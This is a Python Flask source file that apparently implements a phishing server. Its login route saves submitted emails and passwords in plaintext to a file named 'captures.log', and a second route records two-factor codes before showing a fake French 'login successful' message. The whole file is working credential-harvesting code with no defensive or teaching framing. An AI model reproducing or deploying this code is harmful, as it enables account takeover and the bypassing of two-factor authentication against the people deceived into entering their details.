from flask import Flask, request, redirect, render_template
from datetime import datetime

app = Flask(__name__)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        log_data(f"[LOGIN] {email} | {password}")
        return redirect('/2fa')
    return render_template('login.html')

@app.route('/2fa', methods=['GET', 'POST'])
def twofa():
    if request.method == 'POST':
        code = request.form.get('code')
        log_data(f"[2FA] Code: {code}")
        return "<h1>Connexion réussie ✔️</h1>"
    return render_template('2fa.html')

def log_data(entry):
    with open("captures.log", "a") as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        f.write(f"{timestamp} - {entry}\n")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4040)
